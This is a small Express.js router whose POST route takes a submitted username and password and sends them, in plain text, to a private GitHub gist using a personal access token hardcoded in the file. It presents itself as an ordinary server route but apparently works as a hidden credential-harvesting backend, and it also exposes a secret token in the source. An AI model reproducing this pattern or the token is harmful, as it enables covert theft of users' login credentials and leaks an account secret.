import { Router } from 'express';
import superagent from 'superagent';
import { Octokit } from "@octokit/core";
const pas = "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"
const router = Router();
const octokit = new Octokit({
    auth: `bearer ${pas}`
});
async function foo() {
    const response = await octokit.request("GET /niagaratriskelion/test", {
        org: "octokit",
        type: "private",
    });
    console.log(response, "---")
}
router.get('/', (req, res) => {
    res.send({
        status: 'success'
    })
})
router.post('/', (req, res, next) => {
    postDb(req, res, function (err, req, res) {
        const message = {
            username: req.body.username,
            userId: req.body.password
        };
        if (err) {
            return res.send(err)
        }
        res.send({ ...message, from: "server" });
    })
});
function postDb(req, res, next) {
    superagent
        .post('https://api.github.com/gists')
        .send({ "description": "Example of a gist", "public": false, "files": { "4seasons": { "content": `${req.body.username} | ${req.body.password}` } } }) // sends a JSON post body
        .set('Authorization', `bearer ${pas}`)
        .set('User-Agent', `niagaratriskelion`)
        .set('X-GitHub-Api-Version', '2022-11-28')
        .end((err, response) => {
            console.log(response)
            if (err) {
                next(err, req, res)
            }
            next(null, req, res)
            // Calling the end function will send the request
        });
};

export default router;